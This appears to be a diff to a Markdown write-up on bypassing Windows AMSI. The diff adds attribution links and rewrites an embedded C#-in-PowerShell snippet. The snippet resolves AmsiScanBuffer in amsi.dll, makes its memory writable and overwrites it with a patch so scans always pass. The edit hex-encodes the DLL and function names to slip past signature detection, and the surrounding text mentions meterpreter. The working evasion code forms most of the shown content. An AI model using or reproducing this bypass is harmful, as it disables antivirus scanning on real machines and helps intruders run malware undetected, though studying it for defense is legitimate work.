@@ -124,7 +124,7 @@ By setting it at `$true` we can successfully disable AMSI and `amsi.dll`'s `Amsi
 
 It's also possible to _monkeypatch_ at runtime the `amsi.dll` code. In particular, we are interested in patching the function `AmsiScanBuffer`. We can overwrite the logic of this function by making them always return `S_OK`, as when the command is allowed to run. [7]
 
-In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest `C#` version embedded in a `.ps1` script.
+In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest `C#` version embedded in a `.ps1` script, taken from [decoder](https://decoder.cloud)'s [powershellveryless](https://github.com/decoder-it/powershellveryless). [20] [21]
 
 ```powershell
 # Add-Type writes *.cs on disk!!
@@ -149,26 +149,41 @@ namespace Bypass
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
         static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
         public static int Disable()
         {
-            string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
+            string hexbuffer = "41;6d;73;69;53;63;61;6e;42;75;66;66;65;72";
+            string hexdllbuffer = "61;6d;73;69;2e;64;6c;6c";
+
+            string buf1=FromHexBuffer(hexdllbuffer);
+            string buf2=FromHexBuffer(hexbuffer);
+            IntPtr Address = GetProcAddress(LoadLibrary(buf1), buf2);
+
+            UIntPtr size = (UIntPtr)5;
+            uint p = 0;
+
+            VirtualProtect(Address, size, 0x40, out p);
+            byte c1=0xB8,c2=0x80;
+
+            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
+            MoveMemory(Address, unmanagedPointer, 6);
+
+            return 0;
+        }
+
+        public static string FromHexBuffer(String hexdata)
+        {
             string buffer="";
-            string[] hexbuffersplit = hexbuffer.Split(' ');
+            String[] hexbuffersplit = hexdata.Split(';');
             foreach (String hex in hexbuffersplit)
             {
                 int value = Convert.ToInt32(hex, 16);
                 buffer+= Char.ConvertFromUtf32(value);
             }
-            IntPtr Address = GetProcAddress(LoadLibrary("a"+ "msi"+ ".dl" +"l"), buffer);
-            UIntPtr size = (UIntPtr)5;
-            uint p = 0;
-            VirtualProtect(Address, size, 0x40, out p);
-            byte c1=0xB8,c2=0x80;
-            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
-            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
-            MoveMemory(Address, unmanagedPointer, 6);
-            return 0;
+
+            return buffer;
         }
     }
 }
@@ -362,5 +377,7 @@ meterpreter >
 17. [https://cobbr.io/ScriptBlock-Logging-Bypass.html](https://cobbr.io/ScriptBlock-Logging-Bypass.html)
 18. [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
 19. [https://www.youtube.com/watch?v=uE8IAxM_BhE](https://www.youtube.com/watch?v=uE8IAxM_BhE)
+20. [https://decoder.cloud](https://decoder.cloud)
+21. [https://github.com/decoder-it/powershellveryless](https://github.com/decoder-it/powershellveryless)
 
 [back](../)
